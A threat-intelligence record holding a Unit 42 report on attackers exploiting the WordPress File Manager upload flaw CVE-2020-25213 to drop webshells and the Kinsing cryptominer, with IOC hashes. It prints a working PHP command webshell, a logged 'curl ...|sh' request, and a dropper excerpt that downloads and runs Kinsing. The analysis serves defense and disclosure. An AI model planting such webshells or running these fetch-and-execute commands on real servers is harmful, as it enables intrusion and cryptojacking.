{
    "id": "de9b89a6-cf69-4b30-8fbb-51623ad2e7ca",
    "created_at": "2023-01-12T15:10:18.71567Z",
    "updated_at": "2025-03-27T02:17:01.062891Z",
    "deleted_at": null,
    "sha1_hash": "9eb50b4c8d042e4604999ea5b84293edda578506",
    "title": "2021-02-05 - Exploits in the Wild for WordPress File Manager RCE Vulnerability (CVE-2020-25213)",
    "authors": "",
    "file_creation_date": "2022-05-28T15:41:28Z",
    "file_modification_date": "2022-05-28T15:41:28Z",
    "file_size": 127039,
    "plain_text": "# Exploits in the Wild for WordPress File Manager RCE Vulnerability (CVE-2020-25213)\n\n**unit42.paloaltonetworks.com/cve-2020-25213/**\n\nNadav Markus, Efi Barkayev, Gal De Leon February 5, 2021\n\nBy [Nadav Markus,](https://unit42.paloaltonetworks.com/author/nadav-markus/) [Efi Barkayev and](https://unit42.paloaltonetworks.com/author/efi-barkayev/) [Gal De Leon](https://unit42.paloaltonetworks.com/author/gal-de-leon/)\n\nFebruary 5, 2021 at 3:00 PM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [cryptojacking,](https://unit42.paloaltonetworks.com/tag/cryptojacking/) [Cryptominers,](https://unit42.paloaltonetworks.com/tag/cryptominers/) [CVE-2020-25213,](https://unit42.paloaltonetworks.com/tag/cve-2020-25213/) [Kinsing,](https://unit42.paloaltonetworks.com/tag/kinsing/) [Remote Code Exectution,](https://unit42.paloaltonetworks.com/tag/remote-code-exectution/)\n[vulnerabilities,](https://unit42.paloaltonetworks.com/tag/vulnerability/) [WordPress](https://unit42.paloaltonetworks.com/tag/wordpress/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/cve-2020-25213/)\n\n## Executive Summary\n\n[In December 2020, Unit 42 researchers observed attempts to exploit CVE-2020-25213,](https://nvd.nist.gov/vuln/detail/CVE-2020-25213)\nwhich is a file upload vulnerability in the WordPress File Manager plugin. Successful\nexploitation of this vulnerability allows an attacker to upload an arbitrary file with arbitrary\nnames and extensions, leading to Remote Code Execution (RCE) on the targeted web\nserver.\n\n\n-----\n\nThis exploit was used by attackers to install webshells, which in turn were used to install\n[Kinsing, malware that runs a malicious cryptominer from the H2miner family. Kinsing is](https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability)\nbased on the Golang programming language, and its ultimate purpose is to be used in\ncryptojacking attacks on container environments.\n\nPalo Alto Networks customers are protected from CVE-2020-25213 and Kinsing with Cortex\nXDR, [AutoFocus and](https://www.paloaltonetworks.com/cortex/autofocus) [Next-Generation Firewalls with the](https://www.paloaltonetworks.com/network-security/next-generation-firewall) [WildFire security subscription.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n\n## CVE-2020-2513 and Webshells\n\nThe vulnerability stems from the fact that the WordPress File Manager plugin renamed the\nfile extension on the elFinder library's connector.minimal.php.dist file to .php so it could be\nexecuted directly. Since this file has no access restrictions, it can be executed by anyone\nbrowsing the web server. The file contains mechanisms to upload files to the web server\nwithout any authentication. Because of this flaw, allowing anyone to upload files, malicious\nactors started attacking it and uploading webshells, which can be used for further activities\nsuch as installing malware or cryptominers.\n\n## Observed Attack Chain\n\nOur investigation began with the access log of an attacked machine. What caught our\nattention was the following HTTP POST request to the web server:\n\n[19/Dec/2020:08:58:08 +0000] \"POST /wp-content/plugins/wp-filemanager/lib/php/connector.minimal.php HTTP/1.1\" 200 1453 \"-\" \"Mozilla/5.0 (Windows NT\n10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108\nSafari/537.36\"\n\nThis request was used to upload a webshell. Inspecting the log further, we found the culprit –\ni.e., the webshell:\n\n[19/Dec/2020:08:57:48 +0000] \"GET /wp-content/plugins/wp-file-manager/lib/files/k.php?\ncmd=curl+X.X.X.X%2Fwpf.sh%7Csh HTTP/1.1\" 200 411\n\nAs we can see from the above, the webshell was named k.php and was provided a\ncommand to execute. The webshell itself is quite simple as it’s stored in plain text on the web\nserver and contains no obfuscation or authentication measures:\n\n<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']);\nsystem($cmd); echo \"</pre>\"; die; }?>\n\nUpon further examination of the HTTP GET request that was issued to the webshell k.php,\nwe can see it simply invoked the curl command, downloaded a file named wpf.sh and\nexecuted it.\n\n\n-----\n\nWe obtained the shell script from the attacker s command and control (C2) server. Here is a\nsynopsis of the file:\n\n...\n\n$WGET $DIR/kinsing http://X.X.X.X/kinsing\n\nchmod +x $DIR/kinsing\n\n…\n\nSKL=wpf $DIR/kinsing\n\n…\n\nThe file wpf.sh is a script that downloads Kinsing using wget, gives it execute permissions\nand proceeds to execute it.\n\n## Conclusion\n\nWe observed an exploit in the wild for the WordPress File Manager RCE vulnerability CVE2020-25213. Attackers used the exploit to install webshells, which in turn were used to install\nKinsing, which runs a malicious cryptominer from the H2miner family. The ultimate purpose\nof Kinsing is to be used in cryptojacking attacks on container environments.\n\nPalo Alto Networks customers are protected from CVE-2020-25213 in the following ways:\n\nThe Linux Cortex XDR agent blocks this attack. The webshell is detected by the local\nthreat evaluation engine, which is powered by machine learning algorithms.\nThe malware has malicious verdicts in WildFire, a security subscription for the NextGeneration Firewall.\nThe Cortex XDR Behavioral Threat Protection engine prevents both Kinsing and the\npayload cryptominer.\nPalo Alto Networks Threat Prevention covers this vulnerability with TID 59286.\n[AutoFocus has an appropriate tag for the miner and Kinsing.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.H2Miner)\n\n## Indicators of Compromise\n\n**Kinsing Hashes**\n\n6e25ad03103a1a972b78c642bac09060fa79c460011dc5748cbb433cc459938b\n\n5f1e0e3cc38f7888b89a9adddb745a341c5f65165dadc311ca389789cc9c6889\n\n**Cryptominer Hash (H2miner)**\n\n\n-----\n\ndd603db3e2c0800d5eaa262b6b8553c68deaa486b545d4965df5dc43217cc839\n\n**Shell Script Hash**\n\na68ab806c8e111e98ba46d5bfdabd9091a68839dd39dfe81e887361bd4994a62\n\n**Webshell Hash**\n\nf1c5bed9560a1afe9d5575e923e480e7e8030e10bc3d7c0d842b1a64f49f8794\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-05 - Exploits in the Wild for WordPress File Manager RCE Vulnerability (CVE-2020-25213).pdf"
    ],
    "report_names": [
        "2021-02-05 - Exploits in the Wild for WordPress File Manager RCE Vulnerability (CVE-2020-25213).pdf"
    ],
    "threat_actors": [
        {
            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
            "created_at": "2023-01-06T13:46:39.390649Z",
            "updated_at": "2025-03-27T02:00:03.072899Z",
            "deleted_at": null,
            "main_name": "Kinsing",
            "aliases": [
                "Money Libra"
            ],
            "source_name": "MISPGALAXY:Kinsing",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536218,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653752488,
    "ts_modification_date": 1653752488,
    "files": {
        "pdf": "https://archive.orkl.eu/9eb50b4c8d042e4604999ea5b84293edda578506.pdf",
        "text": "https://archive.orkl.eu/9eb50b4c8d042e4604999ea5b84293edda578506.txt",
        "img": "https://archive.orkl.eu/9eb50b4c8d042e4604999ea5b84293edda578506.jpg"
    }
}